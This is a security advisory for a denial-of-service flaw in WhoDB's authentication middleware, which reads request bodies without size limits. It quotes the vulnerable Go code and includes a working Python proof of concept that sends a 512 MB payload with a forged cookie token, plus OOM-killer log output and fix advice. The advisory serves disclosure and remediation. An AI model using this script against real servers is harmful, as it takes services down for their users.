# WhoDB Allows Unbounded Memory Consumption in Authentication Middleware Can Lead to Denial of Service

**GHSA**: GHSA-5pf6-cq2v-23ww | **CVE**: N/A | **Severity**: high (CVSS 7.5)

**CWE**: CWE-400, CWE-770

**Affected Packages**:
- **github.com/clidey/whodb/core** (go): < 0.0.0-20241219102844-e8b608d35422

## Description

### Summary
A Denial of Service (DoS) vulnerability in the authentication middleware allows any client to cause memory exhaustion by sending large request bodies. The server reads the entire request body into memory without size limits, creating multiple copies during processing, which can lead to Out of Memory conditions.

Affects all versions up to the latest one (v0.43.0).

### Details


The vulnerability exists in the AuthMiddleware function in `core/src/auth/auth.go`. The middleware processes all API requests (`/api/*`) and reads the entire request body using `io.ReadAll` without any size limits:

```go
func AuthMiddleware(next http.Handler) http.Handler {
  return http.HandlerFunc(func(w http.ResponseWriter, r http.Request) {
    // No size limit on body reading
    body, err := io.ReadAll(r.Body)

    // ...

    // Creates another copy of the body
    r.Body = io.NopCloser(bytes.NewReader(body))

    // ...

    // Unmarshals the body again, creating more copies
    if err := json.Unmarshal(body, &query); err != nil {
        return false
    }
  })
}
```

The issue is amplified by:
1. A generous 10-minute timeout (`middleware.Timeout(10*time.Minute)`)
2. High throttle limits (10000 concurrent requests, 1000 backlog)
3. Multiple copies of the request body being created during processing
4. No per-client rate limiting

### PoC

1. Run the latest WhoDB:

```
docker run -it -p 127.0.0.1:8080:8080 clidey/whodb
```

2. Prepare a PoC Python script:

```python
import requests
import base64
import json
import time

# Create a sample token
credentials = {
    "database": "test"
}
token = base64.b64encode(json.dumps(credentials).encode()).decode()

# Create a large query that will pass initial checks
# Using "Login" operation which is allowed
payload = {
    "operationName": "Login",
    "variables": {},
    # Create a large string (512 MB)
    "query": "A" * (512 * 1024 * 1024)
}

headers = {
    "Content-Type": "application/json",
    "Cookie": f"Token={token}"  # or use Authorization header if IsAPIGatewayEnabled
}

url = "http://localhost:8080/api/query"  # adjust as needed

print("Sending large payload...")
start = time.time()
try:
    response = requests.post(url, json=payload, headers=headers)
    print(f"Response status: {response.status_code}")
except Exception as e:
    print(f"Request failed: {e}")
print(f"Time taken: {time.time() - start:.2f}s")
```

3. Run the script and observe memory usage of the WhoDB container. Run it a few times in parallel, or increase the payload size. I was able to hit the OOM killer on a 8 GB VM quickly. Process "core" is the entrypoint of the container.

```
[3970241.161574] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=docker-92dede9aa7833cc0db5d7f780a46f57f0b7d627a15d9d0dd6233cd03544542ec.scope,mems_allowed=0,global_oom,task_memcg=/system.slice/docker-92dede9aa7833cc0db5d7f780a46f57f0b7d627a15d9d0dd6233cd03544542ec.scope,task=core,pid=411856,uid=0
[3970241.161611] Out of memory: Killed process 411856 (core) total-vm:8359408kB, anon-rss:5548564kB, file-rss:0kB, shmem-rss:0kB, UID:0 pgtables:11032kB oom_score_adj:0
```

### Impact

- Severity: High
- Authentication Required: No (public API endpoint)
- Affected Components: All API endpoints (`/api/*`)
- Impact Type: Denial of Service

Any client can send arbitrarily large request bodies to the API endpoints. Due to the multiple copies created during processing and lack of size limits, this can quickly exhaust server memory, potentially affecting all users of the system. The high concurrent request limits and long timeout make this particularly effective for DoS attacks.

Fix considerations:
1. Implement request body size limits using `http.MaxBytesReader`
2. Reduce the request timeout from 10 minutes
3. Implement per-client rate limiting
4. Consider streaming body processing instead of loading entirely into memory

